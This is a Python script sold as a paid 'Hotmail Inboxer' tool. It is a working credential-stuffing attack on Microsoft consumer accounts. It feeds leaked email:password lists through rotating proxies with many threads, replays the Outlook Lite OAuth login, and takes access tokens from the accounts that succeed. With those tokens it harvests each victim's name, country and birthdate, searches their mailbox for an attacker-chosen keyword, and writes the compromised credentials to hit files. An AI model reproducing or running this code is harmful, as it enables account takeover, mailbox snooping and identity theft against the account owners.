import requests
import uuid
import json
import re
import threading
import sys
import time
from queue import Queue
from colorama import Fore, init
from user_agent import generate_user_agent

init(autoreset=True)
mwAnas = 40
mwRetries = 99999999999
anasCombo=input(" -- @xDarkLogicx | Hotmail Inboxer [PAID]\n\n [+] Put Combo: ")
anasProxies=input(" [+] Put Proxies File: ")
anasHitsFiles = "Hotmail-Hits.txt"
anasCustomFiles = "Hotmail-Custom.txt"
keyCheckk=input(" [+] Keyword: ")
print("—"*60)
anasHits = 0
anasBad = 0
anasCustom = 0
anasWhite = 0
lock = threading.Lock()
anasComboQueue = Queue()
anasProxyQueue = Queue()
def anasLoadC():
    with open(anasCombo, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if line and '@' in line and ':' in line:
                anasComboQueue.put(line)
def anasLoadP():
    with open(anasProxies, 'r', encoding='utf-8', errors='ignore') as f:
        proxies = [line.strip() for line in f if line.strip()]
        for proxy in proxies:
            anasProxyQueue.put(proxy)
def anasGetProxy():
    proxy = anasProxyQueue.get()
    anasProxyQueue.put(proxy)
    return proxy
def anasFormProxy(proxy):
    if '@' in proxy:
        userpass, ipport = proxy.split('@')
        user, passwd = userpass.split(':')
        ip, port = ipport.split(':')
        return {
            "http": f"http://{user}:{passwd}@{ip}:{port}",
            "https": f"http://{user}:{passwd}@{ip}:{port}"
        }
    else:
        ip, port = proxy.split(':')
        return {
            "http": f"http://{ip}:{port}",
            "https": f"http://{ip}:{port}"
        }
def anasShowStats():
    sys.stdout.write(
        f"\r -- {Fore.GREEN}Hits{Fore.WHITE}: {anasHits} | {Fore.RED}Bad{Fore.WHITE}: {anasBad} | {Fore.CYAN}Custom{Fore.WHITE}: {anasCustom} | {Fore.YELLOW}Retries{Fore.WHITE}: {anasWhite}"
    )
    sys.stdout.flush()
def anasSaveHitssss(line):
    with lock:
        with open(anasHitsFiles, 'a', encoding='utf-8') as f:
            f.write(line + '\n')
def anasSaveCustomssss(line):
    with lock:
        with open(anasCustomFiles, 'a', encoding='utf-8') as f:
            f.write(line + '\n')
def worker():
    global anasHits, anasBad, anasCustom, anasWhite
    while not anasComboQueue.empty():
        combo = anasComboQueue.get()
        if '@' not in combo or ':' not in combo:
            anasComboQueue.task_done()
            continue
        email, password = combo.split(':', 1)
        retries = 0
        while retries < mwRetries:
            proxy = anasGetProxy()
            proxies = anasFormProxy(proxy)
            session = requests.Session()
            try:
                user_agent = generate_user_agent()
                session.proxies = proxies
                url = (
                    "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
                    "client_info=1&haschrome=1&login_hint=" + str(email) +
                    "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                    "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
                    "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
                )
                headers = {
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": user_agent,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,"
                              "image/avif,image/webp,image/apng,*/*;q=0.8,"
                              "application/signed-exchange;v=b3;q=0.9",
                    "return-client-request-id": "false",
                    "client-request-id": str(uuid.uuid4()),
                    "x-ms-sso-ignore-sso": "1",
                    "correlation-id": str(uuid.uuid4()),
                    "x-client-ver": "1.1.0+9e54a0d1",
                    "x-client-os": "28",
                    "x-client-sku": "MSAL.xplat.android",
                    "x-client-src-sku": "MSAL.xplat.android",
                    "X-Requested-With": "com.microsoft.outlooklite",
                    "Sec-Fetch-Site": "none",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "document",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9",
                }
                response = session.get(url, headers=headers, allow_redirects=True, timeout=30)
                response_text = response.text

                PPFT = ""
                urlPost = ""

                server_data_pattern = r'var ServerData = ({.*?});'
                server_data_match = re.search(server_data_pattern, response_text, re.DOTALL)

                if server_data_match:
                    try:
                        server_data_json = server_data_match.group(1)
                        server_data = json.loads(server_data_json)
                        sFTTag = server_data.get('sFTTag', '')
                        if sFTTag:
                            ppft_pattern = r'value="([^"]+)"'
                            ppft_match = re.search(ppft_pattern, sFTTag)
                            if ppft_match:
                                PPFT = ppft_match.group(1)
                        urlPost = server_data.get('urlPost', '')
                    except json.JSONDecodeError:
                        pass

                if not PPFT:
                    start_marker = 'name="PPFT" value="'
                    start_index = response_text.find(start_marker)
                    if start_index != -1:
                        start_index += len(start_marker)
                        end_index = response_text.find('"', start_index)
                        PPFT = response_text[start_index:end_index] if end_index != -1 else ""

                if not urlPost:
                    urlpost_pattern = r'"urlPost":"([^"]+)"'
                    urlpost_match = re.search(urlpost_pattern, response_text)
                    if urlpost_match:
                        urlPost = urlpost_match.group(1)

                cookies_dict = session.cookies.get_dict()
                MSPRequ = cookies_dict.get('MSPRequ', '')
                uaid = cookies_dict.get('uaid', '')
                MSPOK = cookies_dict.get('MSPOK', '')
                OParams = cookies_dict.get('OParams', '')
                referer_url = response.url

                if not PPFT or not urlPost:
                    with lock:
                        anasBad += 1
                        anasShowStats()
                    anasComboQueue.task_done()
                    break

                data_string = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={PPFT}&PPSX=Passport&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=3772"
                LEN = len(data_string)

                headers_post = {
                    "User-Agent": user_agent,
                    "Pragma": "no-cache",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Host": "login.live.com",
                    "Connection": "keep-alive",
                    "Content-Length": str(LEN),
                    "Cache-Control": "max-age=0",
                    "Upgrade-Insecure-Requests": "1",
                    "Origin": "https://login.live.com",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "X-Requested-With": "com.microsoft.outlooklite",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "document",
                    "Referer": referer_url,
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Cookie": f"MSPRequ={MSPRequ}; uaid={uaid}; MSPOK={MSPOK}; OParams={OParams}"
                }

                post_response = session.post(
                    urlPost,
                    data=data_string,
                    headers=headers_post,
                    allow_redirects=False,
                    timeout=30
                )

                cookies_dict = session.cookies.get_dict()
                if "__Host-MSAAUTHP" not in cookies_dict:
                    with lock:
                        anasBad += 1
                        anasShowStats()
                    anasComboQueue.task_done()
                    break

                auth_code = ""
                if post_response.status_code in [301, 302, 303, 307, 308]:
                    redirect_url = post_response.headers.get('Location', '')
                    if redirect_url and 'msauth://' in redirect_url and 'code=' in redirect_url:
                        auth_code = redirect_url.split('code=')[1].split('&')[0]
                else:
                    redirect_pattern = r'window\.location\s*=\s*["\']([^"\']+)["\']'
                    redirect_match = re.search(redirect_pattern, post_response.text)
                    if redirect_match:
                        redirect_url = redirect_match.group(1)
                        if 'msauth://' in redirect_url and 'code=' in redirect_url:
                            auth_code = redirect_url.split('code=')[1].split('&')[0]

                CID = cookies_dict.get('MSPCID', '')
                if CID:
                    CID = CID.upper()

                access_token = ""
                if auth_code:
                    url_token = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
                    data_token = {
                        "client_info": "1",
                        "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                        "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                        "grant_type": "authorization_code",
                        "code": auth_code,
                        "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
                    }
                    token_response = requests.post(url_token, data=data_token, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=30)
                    if token_response.status_code == 200:
                        token_data = token_response.json()
                        access_token = token_data.get("access_token", "")

                Name = ""
                Country = ""
                Birthdate = "N/A"
                Total = "NO"
                if access_token and CID:
                    profile_url = "https://substrate.office.com/profileb2/v2.0/me/V1Profile"
                    profile_headers = {
                        "User-Agent": "Outlook-Android/2.0",
                        "Pragma": "no-cache",
                        "Accept": "application/json",
                        "ForceSync": "false",
                        "Authorization": f"Bearer {access_token}",
                        "X-AnchorMailbox": f"CID:{CID}",
                        "Host": "substrate.office.com",
                        "Connection": "Keep-Alive",
                        "Accept-Encoding": "gzip"
                    }
                    pRes = requests.get(profile_url, headers=profile_headers, timeout=30)
                    if pRes.status_code == 200:
                        profile_data = pRes.json()
                        if "accounts" in profile_data and len(profile_data["accounts"]) > 0:
                            first_account = profile_data["accounts"][0]
                            Country = first_account.get("location", "")
                            BD = first_account.get("birthDay", "")
                            BM = first_account.get("birthMonth", "")
                            BY = first_account.get("birthYear", "")
                            if BD and BM and BY:
                                BD_str = str(BD).zfill(2)
                                BM_str = str(BM).zfill(2)
                                Birthdate = f"{BY}-{BM_str}-{BD_str}"
                        if "names" in profile_data and len(profile_data["names"]) > 0:
                            first_name = profile_data["names"][0]
                            Name = first_name.get("displayName", "")
                    search_url = "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
                    search_payload = {
                        "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
                        "Scenario": {"Name": "owa.react"},
                        "TimeZone": "United Kingdom Standard Time",
                        "TextDecorations": "Off",
                        "EntityRequests": [{
                            "EntityType": "Conversation",
                            "ContentSources": ["Exchange"],
                            "Filter": {
                                "Or": [
                                    {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                                    {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                                ]
                            },
                            "From": 0,
                            "Query": {"QueryString": keyCheckk},
                            "RefiningQueries": None,
                            "Size": 25,
                            "Sort": [
                                {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                                {"Field": "Time", "SortDirection": "Desc"}
                            ],
                            "EnableTopResults": True,
                            "TopResultsCount": 3
                        }],
                        "AnswerEntityRequests": [{
                            "Query": {"QueryString": "Playstation Sony"},
                            "EntityTypes": ["Event", "File"],
                            "From": 0,
                            "Size": 100,
                            "EnableAsyncResolution": True
                        }],
                        "QueryAlterationOptions": {
                            "EnableSuggestion": True,
                            "EnableAlteration": True,
                            "SupportedRecourseDisplayTypes": [
                                "Suggestion", "NoResultModification",
                                "NoResultFolderRefinerModification", "NoRequeryModification", "Modification"
                            ]
                        },
                        "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c"
                    }
                    search_headers = {
                        "User-Agent": "Outlook-Android/2.0",
                        "Pragma": "no-cache",
                        "Accept": "application/json",
                        "ForceSync": "false",
                        "Authorization": f"Bearer {access_token}",
                        "X-AnchorMailbox": f"CID:{CID}",
                        "Host": "substrate.office.com",
                        "Connection": "Keep-Alive",
                        "Accept-Encoding": "gzip",
                        "Content-Type": "application/json"
                    }
                    search_response = requests.post(search_url, json=search_payload, headers=search_headers, timeout=30)
                    if search_response.status_code == 200:
                        search_text = search_response.text
                        date_start = search_text.find('"LastModifiedTime":"')
                        if date_start != -1:
                            date_start += len('"LastModifiedTime":"')
                            date_end = search_text.find('"', date_start)
                            Date = search_text[date_start:date_end] if date_end != -1 else "N/A"
                        else:
                            Date = "N/A"
                        total_start = search_text.find('"Total":')
                        if total_start != -1:
                            total_start += len('"Total":')
                            total_end = search_text.find(',', total_start)
                            if total_end == -1:
                                total_end = search_text.find('}', total_start)
                            Total = search_text[total_start:total_end] if total_end != -1 else "NO"
                        else:
                            Total = "NO TOTAL!"
                        if Total != "0" and Total != "NO TOTAL!":
                            with lock:
                                anasHits += 1
                                anasShowStats()
                            anasSaveHitssss(f"{email}:{password} | Name = {Name} | Country = {Country} | Birthdate = {Birthdate} | Total = {Total}")
                        else:
                            with lock:
                                anasCustom += 1
                                anasShowStats()
                            anasSaveCustomssss(f"{email}:{password} | Name = {Name} | Country = {Country} | Birthdate = {Birthdate}")
                    else:
                        with lock:
                            anasCustom += 1
                            anasShowStats()
                        anasSaveCustomssss(f"{email}:{password} | Name = {Name} | Country = {Country} | Birthdate = {Birthdate}")
                else:
                    with lock:
                        anasBad += 1
                        anasShowStats()
                anasComboQueue.task_done()
                break
            except Exception:
                with lock:
                    anasWhite += 1
                    anasShowStats()
                retries += 1
                time.sleep(0.05)
        anasComboQueue.task_done()
anasLoadC()
anasLoadP()
threads = []
for _ in range(min(mwAnas, anasComboQueue.qsize())):
    t = threading.Thread(target=worker)
    t.daemon = True
    threads.append(t)
    t.start()
for t in threads:
    t.join()